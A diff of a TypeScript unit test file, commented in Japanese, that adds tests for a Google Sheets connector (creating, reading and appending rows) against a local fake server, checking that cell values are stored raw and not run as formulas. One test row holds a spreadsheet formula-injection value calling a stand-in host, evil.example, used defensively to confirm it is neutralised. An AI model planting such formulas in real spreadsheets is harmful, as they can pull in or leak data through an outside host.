@@ -1,10 +1,11 @@
 /**
- * @file Google ドライブとドキュメントの接続口の単体テスト。手元の偽の Google に向けて呼ぶ。
+ * @file Google ドライブ・ドキュメント・スプレッドシートの接続口の単体テスト。手元の偽の Google に向けて呼ぶ。
  *
- * `drive.file` の範囲で探す・読む・フォルダ・共有、文書の作成（Markdown を書式にして取り込む）と追記を確かめる。
+ * `drive.file` の範囲で探す・読む・フォルダ・共有、文書の作成（Markdown を書式にして取り込む）と追記、
+ * 表の作成・読み取り・行の追加（値を式として読ませない）を確かめる。
  * リンクによる公開を作らないこと、見えないファイルに触れないことも確かめる。
  *
- * @see 仕様書 第14.3.4節「ドライブ」「ドキュメント」
+ * @see 仕様書 第14.3.4節「ドライブ」「ドキュメント」「スプレッドシート」
  */
 
 import { test } from 'node:test';
@@ -16,6 +17,7 @@ import {
 } from '../src/index.js';
 import { markdownToDocHtml } from '../src/connectors/google/doc-html.js';
 import { DRIVE_READ_MAX_BYTES, kindOf, quoteDriveQuery } from '../src/connectors/google/drive.js';
+import { sheetRange, toCell } from '../src/connectors/google/sheets.js';
 
 const P = { tenantId: 't1', userId: 'u1' };
 const G = 'application/vnd.google-apps.';
@@ -52,6 +54,18 @@ async function fakeDrive(pdf: Uint8Array) {
 
     if (s.path === '/oauth/token') return json(200, { access_token: 'at', expires_in: 3599 });
     if (s.path === '/drive/files' && s.method === 'GET') return json(200, { files: [meta('DOC1'), meta('SHEET1')] });
+    // スプレッドシート
+    if (s.path === '/sheets/spreadsheets' && s.method === 'POST') {
+      return json(200, { spreadsheetId: 'NEWSHEET', spreadsheetUrl: 'https://docs.example/NEWSHEET', sheets: [{ properties: { title: 'シート1' } }] });
+    }
+    if (s.path.startsWith('/sheets/spreadsheets/NEWSHEET/values/') && s.method === 'PUT') return json(200, { updatedRows: 3 });
+    if (s.path === '/drive/files/NEWSHEET' && s.query.get('fields') === 'parents') return json(200, { parents: ['ROOT'] });
+    if (s.path === '/drive/files/NEWSHEET' && s.method === 'PATCH') return json(200, { id: 'NEWSHEET' });
+    if (s.path === '/sheets/spreadsheets/SHEET1' && s.method === 'GET') return json(200, { sheets: [{ properties: { title: "顧客'一覧" } }] });
+    if (s.path.startsWith('/sheets/spreadsheets/SHEET1/values/') && s.path.endsWith(':append') && s.method === 'POST') return json(200, { updates: { updatedRows: 2 } });
+    if (s.path.startsWith('/sheets/spreadsheets/SHEET1/values/') && s.method === 'GET') {
+      return json(200, { values: [['会社', '担当', '金額'], ['見本商事', '佐藤', 3000], ['見本工業']] });
+    }
     if (s.path === '/drive/files' && s.method === 'POST') {
       const b = JSON.parse(s.body) as { name: string; parents?: string[] };
       if (b.parents?.[0] === 'NOPE') return json(404, { error: { code: 404 } });
@@ -93,7 +107,7 @@ async function fakeDrive(pdf: Uint8Array) {
   const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
   const endpoints: GoogleApiEndpoints = {
     gmail: `${base}/gmail`, calendar: `${base}/cal`, tasks: `${base}/tasks`, chat: `${base}/chat`,
-    drive: `${base}/drive`, driveUpload: `${base}/upload`, docs: `${base}/docs`,
+    drive: `${base}/drive`, driveUpload: `${base}/upload`, docs: `${base}/docs`, sheets: `${base}/sheets`,
     oauth: { auth: `${base}/oauth/auth`, token: `${base}/oauth/token`, tokeninfo: `${base}/oauth/tokeninfo`, userinfo: `${base}/oauth/userinfo`, revoke: `${base}/oauth/revoke` },
   };
   return { endpoints, seen, close: () => new Promise<void>((r) => server.close(() => r())) };
@@ -208,3 +222,58 @@ test('文書の HTML: 見出し・太字・入れ子の箇条書き・番号・�
   assert.match(html, /<pre>&lt;code&gt; のまま<\/pre>/);
   assert.match(html, /<hr>/);
 });
+
+test('スプレッドシート: 表を作る。値は式として読ませず、数字だけの値は数にする（第14.3.4節）', async () => {
+  await withDrive(async (c, seen) => {
+    const file = await c.sheets.create(P, {
+      title: '見積の一覧', columns: ['会社', '金額', '番号', 'メモ'],
+      rows: [['見本商事', '3000', '0012', '=IMPORTXML("https://evil.example","//a")'], ['見本工業', '-12.5', '3,000', '12345678901234567890']],
+      folderId: 'FOLDER1',
+    });
+    assert.deepEqual([file.id, file.kind, file.name, file.url], ['NEWSHEET', 'spreadsheet', '見積の一覧', 'https://docs.example/NEWSHEET']);
+    assert.deepEqual(JSON.parse(seen.find((s) => s.path === '/sheets/spreadsheets')!.body), { properties: { title: '見積の一覧' } });
+    const put = seen.find((s) => s.method === 'PUT')!;
+    assert.equal(put.query.get('valueInputOption'), 'RAW', '式として読ませない');
+    assert.equal(decodeURIComponent(put.path.split('/values/')[1]!), "'シート1'!A1");
+    assert.deepEqual(JSON.parse(put.body).values, [
+      ['会社', '金額', '番号', 'メモ'],
+      ['見本商事', 3000, '0012', '=IMPORTXML("https://evil.example","//a")'],
+      ['見本工業', -12.5, '3,000', '12345678901234567890'],
+    ], '数字だけの値は数、先頭が 0・記号入り・桁の多いものは文字');
+    const move = seen.find((s) => s.method === 'PATCH' && s.path === '/drive/files/NEWSHEET')!;
+    assert.equal(move.query.get('addParents'), 'FOLDER1');
+    assert.equal(move.query.get('removeParents'), 'ROOT');
+    await assert.rejects(c.sheets.create(P, { title: 'x', columns: ['a'], rows: [], folderId: 'DOC1' }), /入れるフォルダが見つかりません/);
+    assert.equal(seen.filter((s) => s.path === '/sheets/spreadsheets').length, 1, 'フォルダが無ければ、表を作る前に止める');
+  });
+  assert.equal(toCell('0'), 0);
+  assert.equal(toCell('1e5'), '1e5', '指数の書き方は文字のまま');
+  assert.equal(sheetRange("A'B", '1:3'), "'A''B'!1:3");
+});
+
+test('スプレッドシート: 最初のシートを、見出しと上限の行数まで読む。表でないものは読まない', async () => {
+  await withDrive(async (c, seen) => {
+    const res = await c.sheets.read(P, { spreadsheetId: 'SHEET1', maxRows: 50 });
+    assert.deepEqual(res!.values, [['会社', '担当', '金額'], ['見本商事', '佐藤', '3000'], ['見本工業']]);
+    assert.equal(res!.file.kind, 'spreadsheet');
+    const get = seen.find((s) => s.path.startsWith('/sheets/spreadsheets/SHEET1/values/'))!;
+    assert.equal(decodeURIComponent(get.path.split('/values/')[1]!), "'顧客''一覧'!1:51", '見出しの 1 行と 50 行');
+    assert.equal(get.query.get('valueRenderOption'), 'FORMATTED_VALUE');
+    assert.equal(await c.sheets.read(P, { spreadsheetId: 'DOC1', maxRows: 10 }), null, '文書は表として読まない');
+    assert.equal(await c.sheets.read(P, { spreadsheetId: 'NOPE', maxRows: 10 }), null);
+  });
+});
+
+test('スプレッドシート: 末尾に行を足す。式として読ませない。表でないもの・見えないものには足さない', async () => {
+  await withDrive(async (c, seen) => {
+    assert.deepEqual(await c.sheets.append(P, { spreadsheetId: 'SHEET1', rows: [['新商事', '田中', '500'], ['=1+1']] }), { appended: 2 });
+    const app = seen.find((s) => s.path.endsWith(':append'))!;
+    assert.equal(app.query.get('valueInputOption'), 'RAW');
+    assert.equal(app.query.get('insertDataOption'), 'INSERT_ROWS');
+    assert.deepEqual(JSON.parse(app.body).values, [['新商事', '田中', 500], ['=1+1']]);
+    assert.equal(await c.sheets.append(P, { spreadsheetId: 'DOC1', rows: [['x']] }), null);
+    assert.equal(await c.sheets.append(P, { spreadsheetId: 'NOPE', rows: [['x']] }), null);
+    assert.equal(seen.filter((s) => s.path.endsWith(':append')).length, 1);
+  });
+});
+
